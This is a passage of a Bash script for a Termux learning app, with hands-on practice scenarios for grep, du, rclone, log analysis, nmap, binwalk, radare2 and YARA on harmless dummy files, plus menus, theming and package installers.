    
    tip "Try: 'find ~ -type f -name \".*\"' or 'grep -r \"SECRET_FLAG\" ~'"
    
    live_lab "Find the value of SECRET_FLAG."
    
    line
    echo -ne "  ${CYAN}Enter the SECRET_FLAG you found: ${NC}"
    read user_flag
    
    if [[ "$user_flag" == "TERMUX_GREP_MASTER_2024" ]]; then
        termux-tts-speak "Access Granted" 2>/dev/null &
        success "Access Granted! You've successfully navigated the file system using search tools."
        rm -rf "$target_dir" # Cleanup
    else
        termux-tts-speak "Access Denied" 2>/dev/null &
        FAILED_SCENARIOS["Security"]=1
        failure "Incorrect flag. Hint: Try searching recursively: 'grep -r \"SECRET_FLAG\" \$HOME'"
    fi
    
    pause
}

#=============================================================================
# FILE FORENSIC SCENARIO: LARGEST FILE
#=============================================================================
forensic_scenario() {
    header "SCENARIO MODE: File Forensic Challenge"
    FAILED_SCENARIOS["Forensics"]=0
    
    # Setup challenge environment
    local target_dir="$HOME/.forensic_lab"
    mkdir -p "$target_dir"
    # Create files of different sizes
    truncate -s 10K "$target_dir/evidence_a.log"
    truncate -s 50K "$target_dir/evidence_b.db"
    truncate -s 5K "$target_dir/evidence_c.txt"
    truncate -s 120K "$target_dir/suspicious_payload.bin"

    echo -e "  ${WHITE}Your Mission:${NC}"
    echo -e "  A system is behaving strangely, and we suspect a large binary has been dropped."
    echo -e "  Your task is to identify the largest file in the forensic lab directory."
    echo ""
    echo -e "  ${CYAN}Task 1:${NC} Use 'du' to check file sizes in ~/.forensic_lab."
    echo -e "  ${CYAN}Task 2:${NC} Use 'sort' to order them by size and find the biggest one."
    echo ""
    
    tip "Try: 'du -a ~/.forensic_lab | sort -n' or 'du -sh ~/.forensic_lab/* | sort -h'"
    
    live_lab "Identify the largest file in ~/.forensic_lab."
    
    line
    echo -ne "  ${CYAN}Enter the name of the largest file: ${NC}"
    read user_answer
    
    if [[ "$user_answer" == "suspicious_payload.bin" ]]; then
        termux-tts-speak "Evidence Found" 2>/dev/null &
        success "Excellent! You've identified the culprit. File size analysis is key to forensics."
        rm -rf "$target_dir" # Cleanup
    else
        termux-tts-speak "Analysis Failed" 2>/dev/null &
        FAILED_SCENARIOS["Forensics"]=1
        failure "That's not it. Hint: Use 'du -a ~/.forensic_lab | sort -n' and look at the last entry."
    fi
    
    pause
}

#=============================================================================
# CLOUD FORENSICS SCENARIO: Rclone Hidden File Hunt
#=============================================================================
cloud_forensics_scenario() {
    header "SCENARIO MODE: Cloud Forensics Challenge"
    FAILED_SCENARIOS["Cloud Forensics"]=0
    
    # Setup challenge environment
    local lab_dir="$HOME/rclone_forensics_lab"
    local remote_name="mycloud"
    local config_file="$HOME/.config/rclone/rclone.conf"

    mkdir -p "$lab_dir"
    mkdir -p "$(dirname "$config_file")"

    # Create a dummy rclone config for a local remote
    cat <<EOF > "$config_file"
[${remote_name}]
type = local
nounc = true
EOF

    # Create some normal files and a hidden suspicious file
    echo "normal_document.txt" > "$lab_dir/document.txt"
    echo "important_report.pdf" > "$lab_dir/report.pdf"
    echo "SECRET_CLOUD_CONFIG_FLAG_XYZ" > "$lab_dir/.hidden_cloud_config"

    echo -e "  ${WHITE}Your Mission:${NC}"
    echo -e "  A simulated cloud storage ('${remote_name}:') is suspected of containing a hidden, sensitive configuration file."
    echo -e "  Your task is to find this hidden file using 'rclone'."
    echo ""
    echo -e "  ${CYAN}Task 1:${NC} List all files in the '${remote_name}:' remote, including hidden ones."
    echo -e "  ${CYAN}Task 2:${NC} Identify the name of the hidden configuration file."
    echo ""
    
    tip "Helpful commands: 'rclone ls ${remote_name}:', 'rclone lsl ${remote_name}: --fast-list', 'rclone ls ${remote_name}: -a'"
    
    live_lab "Find the hidden configuration file in the '${remote_name}:' remote."
    
    line
    echo -ne "  ${CYAN}Enter the name of the hidden configuration file (e.g., .config.json): ${NC}"
    read user_answer
    
    if [[ "$user_answer" == ".hidden_cloud_config" ]]; then
        success "Excellent! You've successfully uncovered the hidden cloud configuration. Cloud forensics skills: acquired!"
        rm -rf "$lab_dir" "$config_file" # Cleanup
    else
        FAILED_SCENARIOS["Cloud Forensics"]=1
        failure "Incorrect. Hint: You need to list hidden files. The file is named '.hidden_cloud_config'."
    fi
    
    pause
}

#=============================================================================
# LOG ANALYSIS SCENARIO: TRAFFIC ANALYSIS
#=============================================================================
log_analysis_scenario() {
    header "SCENARIO MODE: Log Analysis Challenge"
    FAILED_SCENARIOS["Logs"]=0
    
    # Setup challenge environment
    local target_dir="$HOME/log_lab"
    mkdir -p "$target_dir"
    cat <<EOF > "$target_dir/access.log"
192.168.1.1 - - [29/Oct/2023:10:00:01] "GET /index.html"
172.16.0.10 - - [29/Oct/2023:10:00:02] "GET /api/v1"
192.168.1.1 - - [29/Oct/2023:10:00:03] "POST /login"
172.16.0.10 - - [29/Oct/2023:10:00:04] "GET /styles.css"
10.0.0.5 - - [29/Oct/2023:10:00:05] "GET /favicon.ico"
172.16.0.10 - - [29/Oct/2023:10:00:06] "GET /api/v1"
1.1.1.1 - - [29/Oct/2023:10:00:07] "GET /"
172.16.0.10 - - [29/Oct/2023:10:00:08] "GET /api/v1"
192.168.1.1 - - [29/Oct/2023:10:00:09] "GET /index.html"
1.1.1.1 - - [29/Oct/2023:10:00:10] "GET /"
172.16.0.10 - - [29/Oct/2023:10:00:11] "GET /api/v2"
EOF

    echo -e "  ${WHITE}Your Mission:${NC}"
    echo -e "  A web server is receiving high traffic. You need to identify"
    echo -e "  which IP address is making the most requests."
    echo ""
    echo -e "  ${CYAN}Task 1:${NC} Use 'awk' to print the first column (IPs) of access.log."
    echo -e "  ${CYAN}Task 2:${NC} Use 'sort' and 'uniq -c' to count occurrences."
    echo -e "  ${CYAN}Task 3:${NC} Sort the results numerically to find the top requester."
    echo ""
    
    tip "Try: 'awk \"{print \$1}\" access.log | sort | uniq -c | sort -nr'"
    
    live_lab "Analyze access.log in ~/log_lab to find the most frequent IP."
    
    line
    echo -ne "  ${CYAN}Enter the IP address with the most requests: ${NC}"
    read user_answer
    
    if [[ "$user_answer" == "172.16.0.10" ]]; then
        success "Correct! 172.16.0.10 had 5 requests. You're a log analysis pro!"
        rm -rf "$target_dir" # Cleanup
    else
        FAILED_SCENARIOS["Logs"]=1
        failure "Incorrect. Hint: The top entry in 'sort -nr' will be the answer."
    fi
    
    pause
}

#=============================================================================
# SYSTEM HEALTH SCENARIO: MEMORY HOG
#=============================================================================
system_health_scenario() {
    header "SCENARIO MODE: System Health Challenge"
    FAILED_SCENARIOS["Health"]=0

    echo -e "  ${WHITE}Your Mission:${NC}"
    echo -e "  The system is running slow. You suspect a memory leak or a"
    echo -e "  heavy process is hogging resources."
    echo ""
    echo -e "  ${CYAN}Task 1:${NC} Use 'top' (interactive) or 'ps' (snapshot) to list processes."
    echo -e "  ${CYAN}Task 2:${NC} Identify which process is consuming the most MEMORY (%MEM)."
    echo ""
    save_progress

    tip "Try: 'ps -eo pid,comm,%mem --sort=-%mem | head -n 5' or simply 'top' and look at the %MEM column."

    live_lab "Identify the command name of the top memory consumer."

    line
    # Calculate the expected answer after exiting lab (use top -b for parsing)
    local expected=$(top -n 1 -b | grep -A 1 "PID" | tail -n 1 | awk '{print $NF}')

    echo -e "  ${WHITE}Investigation Result:${NC}"
    echo -ne "  ${CYAN}Which process name did you find at the top? ${NC}"
    read user_answer

    if [[ "$user_answer" == "$expected" ]]; then
        success "Correct! '$user_answer' is currently the top memory consumer."
    else
        FAILED_SCENARIOS["Health"]=1
        failure "That doesn't seem right. Based on current system state, the top process is '$expected'."
    fi

    pause
}

#=============================================================================
# SYSTEM MONITORING SCENARIO: HTOP & NEOFETCH
#=============================================================================
monitoring_scenario() {
    header "SCENARIO MODE: System Monitoring"

    echo -e "  ${WHITE}Your Mission:${NC}"
    echo -e "  You are tasked with performing a high-level health check of this"
    echo -e "  Android environment to verify system specs and resource load."
    echo ""
    echo -e "  ${CYAN}Task 1:${NC} Use 'neofetch' to view OS, Kernel, and hardware specs."
    echo -e "  ${CYAN}Task 2:${NC} Use 'htop' to monitor active CPU cores and memory usage."
    echo ""

    tip "In htop: Use 'F10' to exit, 'F6' to sort, and 'F4' to filter processes."

    live_lab "Run 'neofetch' for system info, then 'htop' for live monitoring."

    line
    echo -e "  ${WHITE}Verification Quiz:${NC}"
    quiz "Which tool displays system information alongside a colorful ASCII logo?" "htop" "neofetch" "top" "B"
    
    if [ $? -eq 0 ]; then
        quiz "In htop, which function key is used to filter the process list by name?" "F3" "F4" "F9" "B"
    fi

    if [ $? -eq 0 ]; then
        success "Monitoring Complete! You now know how to keep an eye on your system health."
    else
        warn "Review the htop shortcut keys and try again!"
    fi

    pause
}

#=============================================================================
# NMAP RECON MISSION
#=============================================================================
nmap_scenario() {
    header "SCENARIO MODE: Nmap Reconnaissance"
    FAILED_SCENARIOS["Nmap"]=0
    echo -e "  ${WHITE}Your Mission:${NC}"
    echo -e "  A new server has appeared on the test network. You must map it."
    echo ""
    echo -e "  ${CYAN}Task 1:${NC} Use Nmap to perform an aggressive scan (-A)."
    echo -e "  ${CYAN}Task 2:${NC} Focus the scan on ports 80 and 443 (-p 80,443)."
    echo -e "  ${CYAN}Task 3:${NC} Save the output to a file named 'recon.txt' (-oN)."
    echo ""
    tip "Example: 'nmap -A -p 80,443 -oN recon.txt scanme.nmap.org'"
    
    live_lab "Objective: Perform a deep audit of scanme.nmap.org and log it."
    save_progress

    line
    echo -e "  ${WHITE}Mission Validation:${NC}"
    quiz "Which flag enables OS detection, version detection, and script scanning?" "-sP" "-A" "-Pn" "B"
    
    pause
}

#=============================================================================
# BINWALK FORENSIC SCENARIO
#=============================================================================
binwalk_scenario() {
    header "SCENARIO MODE: Binwalk Forensic Analysis"
    FAILED_SCENARIOS["Binwalk"]=0
    
    # Setup challenge environment
    local lab_dir="$HOME/binwalk_lab"
    mkdir -p "$lab_dir"
    
    # Create the 'steg' file: A fake JPEG with a ZIP archive appended
    echo "FAKE_JPEG_HEADER_CONTENT" > "$lab_dir/mystery.jpg"
    echo "SECRET_FLAG_IS_BINWALK_MASTER" > "$lab_dir/flag.txt"
    # Silently zip the flag
    pkg install zip -y > /dev/null 2>&1
    (cd "$lab_dir" && zip -q flag.zip flag.txt)
    # Append zip to the 'image'
    cat "$lab_dir/mystery.jpg" "$lab_dir/flag.zip" > "$lab_dir/target.bin"
    # Cleanup source files
    rm "$lab_dir/mystery.jpg" "$lab_dir/flag.zip" "$lab_dir/flag.txt"

    echo -e "  ${WHITE}Your Mission:${NC}"
    echo -e "  We have recovered a file 'target.bin'. It looks like an image but its"
    echo -e "  entropy suggests hidden data is appended to the binary."
    echo ""
    echo -e "  ${CYAN}Task 1:${NC} Run 'binwalk target.bin' to identify the embedded ZIP."
    echo -e "  ${CYAN}Task 2:${NC} Use 'binwalk -e target.bin' to extract the contents."
    echo -e "  ${CYAN}Task 3:${NC} Find and read the extracted 'flag.txt'."
    echo ""
    
    tip "After extraction, look for a directory named '_target.bin.extracted'."
    
    live_lab "Analyze target.bin in ~/binwalk_lab."
    
    line
    echo -ne "  ${CYAN}Enter the hidden flag: ${NC}"
    read user_flag
    
    if [[ "$user_flag" == "SECRET_FLAG_IS_BINWALK_MASTER" ]]; then
        success "Access Granted! You've successfully performed binary carving."
        rm -rf "$lab_dir"
    else
        FAILED_SCENARIOS["Binwalk"]=1
        failure "Incorrect. The flag is located inside the extracted 'flag.txt'."
    fi
    pause
}

#=============================================================================
# RADARE2 STRING PATCHING SCENARIO
#=============================================================================
radare2_scenario() {
    header "SCENARIO MODE: Radare2 String Patching"
    FAILED_SCENARIOS["Radare2"]=0
    
    # Setup challenge environment
    local lab_dir="$HOME/radare2_lab"
    mkdir -p "$lab_dir"
    cd "$lab_dir"

    # Create a simple C program
    cat <<EOF > hello.c
#include <stdio.h>
int main() {
    printf("Hello, World!\\n");
    return 0;
}
EOF

    # Compile it (ensure clang is installed for Termux)
    pkg install clang -y > /dev/null 2>&1
    clang hello.c -o hello_bin

    echo -e "  ${WHITE}Your Mission:${NC}"
    echo -e "  You have a binary 'hello_bin' that prints 'Hello, World!'."
    echo -e "  Your task is to patch this binary to make it print 'Hello, Termux!' instead."
    echo ""
    echo -e "  ${CYAN}Task 1:${NC} Open 'hello_bin' in Radare2 with write permissions ('r2 -w hello_bin')."
    echo -e "  ${CYAN}Task 2:${NC} Analyze the binary ('aaa')."
    echo -e "  ${CYAN}Task 3:${NC} List strings ('iz') and find the address of 'Hello, World!'."
    echo -e "  ${CYAN}Task 4:${NC} Seek to that address ('s <address>')."
    echo -e "  ${CYAN}Task 5:${NC} Write the new string 'Hello, Termux!' ('w Hello, Termux!')."
    echo -e "  ${CYAN}Task 6:${NC} Quit Radare2 ('q')."
    echo ""
    tip "The new string must be the same length as the old one (13 characters)."
    
    live_lab "Patch 'hello_bin' to change its output."
    
    local output=$(./hello_bin 2>/dev/null)
    if [[ "$output" == "Hello, Termux!" ]]; then
        success "Binary patched successfully! You are a Radare2 string master."
        rm -rf "$lab_dir"
    else
        FAILED_SCENARIOS["Radare2"]=1
        failure "Patch failed. The binary still outputs: '$output'. Make sure the new string is exactly 'Hello, Termux!'."
    fi
    pause
}

#=============================================================================
# YARA MALWARE DETECTION SCENARIO
#=============================================================================
yara_scenario() {
    header "SCENARIO MODE: YARA Malware Detection"
    FAILED_SCENARIOS["YARA"]=0
    
    # Setup challenge environment
    local lab_dir="$HOME/yara_lab"
    mkdir -p "$lab_dir"
    echo "This is a legitimate system configuration file." > "$lab_dir/config.sys"
    echo "User data and preferences." > "$lab_dir/data.txt"
    echo "CRITICAL_MALWARE_SIGNATURE_XYZ_999" > "$lab_dir/suspicious.bin"

    echo -e "  ${WHITE}Your Mission:${NC}"
    echo -e "  A file in '~/yara_lab' is suspected of being malware."
    echo -e "  You must use YARA to identify the infected file."
    echo ""
    echo -e "  ${CYAN}Task 1:${NC} Create a rule file 'myrule.yar' using a text editor."
    echo -e "  ${CYAN}Task 2:${NC} Define a rule searching for the string 'CRITICAL_MALWARE'."
    echo -e "  ${CYAN}Task 3:${NC} Run 'yara myrule.yar ~/yara_lab' to find the match."
    echo ""
    tip "Rule structure: rule DetectMalware { strings: \$a = \"CRITICAL_MALWARE\" condition: \$a }"
    
    live_lab "Detect the malware in ~/yara_lab."
    
    # --- Automated YARA rule validation ---
    # Check if rule file exists
    if [[ ! -f "$lab_dir/myrule.yar" ]]; then
        failure "Error: 'myrule.yar' not found in '$lab_dir'. Did you create it during the lab?"
        FAILED_SCENARIOS["YARA"]=1
        pause
        return
    fi

    # Attempt to compile and run the rule against the lab directory
    # Capture output and exit code
    local yara_output
    yara_output=$(yara "$lab_dir/myrule.yar" "$lab_dir" 2>&1)
    local yara_exit_code=$?

    if [[ $yara_exit_code -ne 0 ]]; then
        failure "Error: Your YARA rule 'myrule.yar' is invalid or failed to run. Please check its syntax. Output: $yara_output"
        FAILED_SCENARIOS["YARA"]=1
        pause
        return
    fi

    if ! echo "$yara_output" | grep -q "DetectMalware $lab_dir/suspicious.bin"; then
        failure "Error: Your YARA rule did not correctly identify 'suspicious.bin'. Check your rule's string and condition."
        FAILED_SCENARIOS["YARA"]=1
        pause
        return
    fi
    success "Your YARA rule 'myrule.yar' is valid and correctly identified the malware!"
    # --- End of YARA rule validation ---

    line
    echo -ne "  ${CYAN}Which filename was flagged by YARA? ${NC}"
    read user_answer
    
    if [[ "$user_answer" == "suspicious.bin" ]]; then
        success "Excellent! You've used YARA to identify malware signatures."
        rm -rf "$lab_dir"
    else
        FAILED_SCENARIOS["YARA"]=1
        failure "Incorrect. Hint: Look at the file paths in the YARA output."
    fi
    pause
}

#=============================================================================
# THEME SELECTOR
#=============================================================================
theme_selector() {
    header "THEME MANAGER"
    echo -e "  ${GREEN}[1]${NC} Classic Termux" # Not a prompt, no change needed.
    echo -e "  ${GREEN}[2]${NC} Cyberpunk Neon (Dark)"
    echo -e "  ${GREEN}[3]${NC} Matrix (Green on Black)"
    echo -e "  ${GREEN}[4]${NC} NeonNight (Pink on Deep Blue)"
    echo ""
    echo -ne "  ${NC}\033[25mChoose Theme: ${NC}" # This is a prompt, but not yellow. Adding \033[25m for consistency.
    read -n 1 tchoice
    case $tchoice in
        1) set_theme_classic ;;
        2) set_theme_cyber ;;
        3) set_theme_matrix ;;
        4) set_theme_neon_night ;;
    esac
    echo ""
    loading_anim 1
    success "Theme updated!"
    sleep 0.5
}

#=============================================================================
# SEARCH FEATURE
#=============================================================================
search_feature() {
    header "FIND LESSONS OR TOOLS"
    echo -ne "  ${NC}\033[25m${YELLOW}Search for keyword: ${NC}"
    read query
    
    if [[ -z "$query" ]]; then return; fi

    local found=0
    echo ""
    echo -e "  ${WHITE}━━━ MATCHING LESSONS ━━━${NC}"
    for i in "${!LESSON_TITLES[@]}"; do
        if [[ "${LESSON_TITLES[$i],,}" == *"${query,,}"* ]]; then
            echo -e "  ${GREEN}[$i]${NC} ${LESSON_TITLES[$i]}"
            found=1
        fi
    done | sort -V

    echo ""
    echo -e "  ${WHITE}━━━ MATCHING TOOLS ━━━${NC}"
    for tool in "${!TOOLS_TO_CHECK[@]}"; do
        local tool_data="${TOOLS_TO_CHECK[$tool]}"
        local desc=$(echo "$tool_data" | cut -d';' -f3)
        if [[ "${tool,,}" == *"${query,,}"* ]] || [[ "${desc,,}" == *"${query,,}"* ]]; then
            echo -e "  ${CYAN}● ${tool}${NC}: ${desc}"
            found=1
        fi
    done

    if [[ $found -eq 1 ]]; then
        echo ""
        echo -e "  ${NC}\033[25m${YELLOW}Enter lesson number to start, or press ENTER to return.${NC}"
        read -p "  ➤ " selection
        if [[ "$selection" =~ ^[0-9]+$ ]] && [[ -n "${LESSON_TITLES[$selection]}" ]]; then
            lesson_$selection
        fi
    else
        failure "No results found for '$query'."
        pause
    fi
}

#=============================================================================
# RESET PROGRESS
#=============================================================================
reset_progress() {
    header "RESET ALL PROGRESS"
    warn "This will permanently clear all completed lessons and timestamps."
    echo -ne "  ${NC}\033[25m${YELLOW}Are you sure you want to reset? (y/n): ${NC}"
    read -n 1 confirm
    echo ""

    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        # Reset the associative array
        DONE_LESSONS=()
        # Remove the progress file
        rm -f "$PROGRESS_FILE"
        success "Progress has been cleared successfully."
    else
        echo -e "  ${CYAN}Reset cancelled.${NC}"
    fi
    pause
}

#=============================================================================
# SCENARIO SELECTOR
#=============================================================================
scenario_mode() {
    while true; do
        header "SCENARIO MODE: Select a Challenge"
        echo -e "  ${GREEN}[1]${NC} Networking Challenge (IP & Ports)"
        echo -e "  ${GREEN}[2]${NC} Security Challenge (Hidden File Hunt)"
        echo -e "  ${GREEN}[3]${NC} File Forensic Challenge (Largest File)"
        echo -e "  ${GREEN}[4]${NC} Log Analysis Challenge (Top Requester)"
        echo -e "  ${GREEN}[5]${NC} System Health Challenge (Memory Hog)"
        echo -e "  ${GREEN}[6]${NC} System Monitoring (htop & neofetch)"
        echo -e "  ${GREEN}[7]${NC} Cloud Forensics Challenge (Rclone)"
        echo -e "  ${GREEN}[8]${NC} Modern Tooling Challenge (Bat & Eza)"
        echo -e "  ${GREEN}[9]${NC} Nmap Recon Mission (Advanced Scan)"
        echo -e "  ${GREEN}[10]${NC} Binwalk Forensics (Binary Carving)"
        echo -e "  ${GREEN}[11]${NC} Radare2 String Patching (Binary Forensics)"
        echo -e "  ${GREEN}[12]${NC} YARA Malware Detection (Pattern Matching)"
        echo -e "  ${RED}[B]${NC} Back to Main Menu"
        echo ""
        echo -ne "  ${NC}\033[25m${YELLOW}➤ Choice: ${NC}"
        read s_choice
        case $s_choice in
            1) networking_scenario ;;
            7) cloud_forensics_scenario ;;
            2) security_scenario ;;
            3) forensic_scenario ;;
            4) log_analysis_scenario ;;
            5) system_health_scenario ;;
            6) monitoring_scenario ;;
            10) binwalk_scenario ;;
            11) radare2_scenario ;;
            12) yara_scenario ;;
            9) nmap_scenario ;;
            [Bb]) return ;;
            *) echo -e "  ${RED}Invalid choice.${NC}"; sleep 1 ;;
        esac
    done
}

#=============================================================================
# MAIN MENU
#=============================================================================
main_menu() {
    while true; do
        local term_width=$(get_width)
        local box_width=60
        local margin=$(( (term_width - box_width) / 2 ))
        (( margin < 0 )) && margin=0
        local pad=$(printf "%${margin}s" "")
        local clock=$(date '+%H:%M:%S')
        local batt_val=$(termux-battery-status 2>/dev/null | grep percentage | grep -o '[0-9]*')
        local battery="${batt_val:-??}"

        clear
        thick_line
        center "${WHITE}🚀 TERMUX MASTERCLASS: Welcome, $USER_NAME! | ${YELLOW}🕒 $clock${NC} | ${GREEN}🔋 $battery%${NC}"
        show_progress
        thick_line

        echo -e "${pad}${YELLOW}╔══════════════════════════════════════════════════════╗${NC}"
        echo -e "${pad}║ ${CYAN}[1]${NC} Learn Termux Tools (The Full Curriculum)          ║"
        echo -e "${pad}║ ${CYAN}[T]${NC} Final Graduation Exam                            ║"
        echo -e "${pad}╚══════════════════════════════════════════════════════╝${NC}"
        echo ""
        center "${CYAN}[F]${NC} Find  ${CYAN}[S]${NC} Scenarios  ${CYAN}[L]${NC} Tools Lab  ${CYAN}[C]${NC} Challenge  ${CYAN}[Y]${NC} Try Again"
        center "${CYAN}[V]${NC} Review  ${CYAN}[U]${NC} Profile  ${CYAN}[E]${NC} Export  ${CYAN}[M]${NC} Themes"
        center "${CYAN}[R]${NC} Reset  ${CYAN}[A]${NC} All  ${CYAN}[I]${NC} Install  ${CYAN}[B]${NC} Bulk  ${RED}[Q]${NC} Quit"
        line
        echo -ne "${pad}  ${NC}\033[25m${YELLOW}Command ➤ ${NC}"
        
        # Use 1-second timeout to allow the clock to refresh
        read -t 1 choice
        [[ -z "$choice" ]] && continue

        case $choice in
            [Ff]) search_feature ;;
            [Rr]) reset_progress ;;
            [Ee]) export_report ;;
            [Mm]) theme_selector ;;
            [Uu]) show_profile ;;
            1) learn_termux_tools ;;
            [Ss]) scenario_mode ;;
            [Bb]) bulk_install_all ;;
            [Yy]) try_again_session ;;
            [Ll]) tools_lab ;;
            [Vv]) review_mode ;;
            [Cc]) challenge_mode ;;
            [Tt]) graduation_exam ;;
            [Aa])
                for i in {1..34}; do
                    lesson_$i
                done
                ;;
            [Ii])
                quick_install
                ;;
            [Qq]) 
                echo ""
                echo -e "  ${GREEN}Thanks for learning! Happy hacking! 🚀${NC}"
                echo ""
                exit 0
                ;;
            *)
                echo -e "  ${RED}Invalid choice. Try again.${NC}"
                sleep 1
                ;;
        esac
    done
}

#=============================================================================
# BULK INSTALL ALL TOOLS
#=============================================================================
bulk_install_all() {
    header "BULK INSTALLER: All Platform Tools"
    echo -e "  ${WHITE}This session will automate the installation of all tools listed${NC}"
    echo -e "  ${WHITE}on this platform (Total: ${#TOOLS_TO_CHECK[@]}).${NC}"
    echo ""
    warn "This may take a long time and significant storage space."
    echo -ne "  ${NC}\033[25m${YELLOW}Proceed with bulk installation? (y/n): ${NC}"
    read -n 1 confirm
    echo ""
    
    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        pkg update -y
        for tool in "${!TOOLS_TO_CHECK[@]}"; do
            local data="${TOOLS_TO_CHECK[$tool]}"
            local check=$(echo "$data" | cut -d';' -f1)
            local install=$(echo "$data" | cut -d';' -f2)
            
            # Skip conceptual tools that don't have real install commands
            if [[ "$install" == "echo true"* ]]; then
                echo -e "  ${YELLOW}[-] Skipping conceptual tool: ${CYAN}$tool${NC}"
                continue
            fi

            echo -ne "  ${WHITE}[..] Processing ${CYAN}$tool${NC}... "
            if eval "$check" > /dev/null 2>&1; then
                success "Already present"
            else
                echo -e "${YELLOW}Installing...${NC}"
                eval "$install"
                if [ $? -eq 0 ]; then
                    success "Installed $tool"
                else
                    failure "Failed $tool"
                fi
            fi
        done
        success "Bulk installation process completed!"
        termux-setup-storage 2>/dev/null
    else
        echo -e "  ${YELLOW}Installation cancelled.${NC}"
    fi
    pause
}

#=============================================================================
# QUICK INSTALL FUNCTION
#=============================================================================
quick_install() {
    header "Quick Install - Essential Packages"

    echo -e "  ${WHITE}This will install the most commonly used packages.${NC}"
    echo ""
    echo -e "  ${CYAN}Packages to install:${NC}"
    echo -e "  git curl wget openssh python nodejs nano vim"
    echo -e "  nmap tmux tree jq fzf htop man termux-api"
    echo -e "  proot-distro build-essential ffmpeg micro"
    echo -e "  zsh neofetch"
    echo ""
    echo -ne "  ${NC}\033[25m${YELLOW}Proceed? (y/n): ${NC}"
    read confirm

    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        echo ""
        echo -e "  ${CYAN}Updating packages...${NC}"
        pkg update -y && pkg upgrade -y
        echo ""
        echo -e "  ${CYAN}Installing packages...${NC}"
        pkg install -y \
            git curl wget openssh python nodejs \
            nano vim nmap tmux tree jq fzf \
            htop man termux-api proot-distro \
            build-essential coreutils ffmpeg micro \
            zsh neofetch
        echo ""
        echo -e "  ${GREEN}✔ Installation complete!${NC}"
        echo ""
        echo -e "  ${CYAN}Setting up storage access...${NC}"
        termux-setup-storage 2>/dev/null
        echo ""
        echo -e "  ${GREEN}✔ All done! You're ready to go!${NC}"
    else
        echo -e "  ${YELLOW}Cancelled.${NC}"
    fi

    pause
}

#=============================================================================
# STARTUP BANNER
#=============================================================================
display_startup_banner() {
    local banner_lines=(
        "  _______ ______ _____  __  __ _    ___  __"
        " |__   __|  ____|  __ \|  \/  | |  | \ \/ /"
        "    | |  | |__  | |__) | \  / | |  | |\  / "
        "    | |  |  __| |  _  /| |\/| | |  | |/  \ "
        "    | |  | |____| | \ \| |  | | |__| /  /\ \\"
        "    |_|  |______|_|  \_\_|  |_|\____/_/  \_\\"
    )

    clear
    local w=$(get_width)
    echo -e "${CYAN}"
    center "BOOTING MASTERCLASS..."
    loading_anim 1

    # --- Cyber Glitch Effect ---
    termux-tts-speak --pitch 0.5 --rate 2.0 "static" 2>/dev/null & # Play glitch sound
    local glitch_colors=("$CYAN" "$MAGENTA" "$WHITE" "$GREEN" "$RED" "$YELLOW")
    for i in {1..12}; do
        clear
        center "${CYAN}BOOTING MASTERCLASS...${NC}"
        echo -e "\r  ${GREEN}✔${NC} System Ready.          "
        echo -e "\n${glitch_colors[$RANDOM % ${#glitch_colors[@]}]}"
        for line in "${banner_lines[@]}"; do
            local glitched="$line"
            if (( i % 4 == 0 )); then
                # Randomly swap characters for glitch feel
                glitched=$(echo "$line" | tr "=|/\\" "?!%#")
            fi
            center "$glitched"
        done
        sleep 0.04
    done

    clear
    center "${CYAN}BOOTING MASTERCLASS...${NC}"
    echo -e "\r  ${GREEN}✔${NC} System Ready.          "
    echo -e "\n${MAGENTA}"
     for line in "${banner_lines[@]}"; do
        center "$line"
        sleep 0.03
    done
    
    echo -e "${NC}\n"
    
    # Animated login sequence
    echo -ne "  ${WHITE}[SYSTEM]${NC} "
    typewriter "Establishing secure shell..." 0.02
    echo -ne "  ${WHITE}[USER]${NC}   "
    typewriter "Authenticated: $USER_NAME" 0.02
    echo -ne "  ${WHITE}[STATUS]${NC} "
    typewriter "Initialization complete." 0.02
    
    echo -e "\n"
    center "${YELLOW}Press any key to start...${NC}"
    read -n 1 -s
}

#=============================================================================
# ENTRY POINT
#=============================================================================

# Check if running in Termux (optional, works on other Linux too)
if [ -d "/data/data/com.termux" ] || [ -n "$TERMUX_VERSION" ]; then
    echo -e "${GREEN}Running in Termux environment ✔${NC}"
elif [ -n "$BASH_VERSION" ]; then
    echo -e "${YELLOW}Not in Termux, but the lesson content is still viewable ✔${NC}"
fi

# Load previous progress before showing the menu
load_progress

# Display startup banner
display_startup_banner

# Run the main menu
main_menu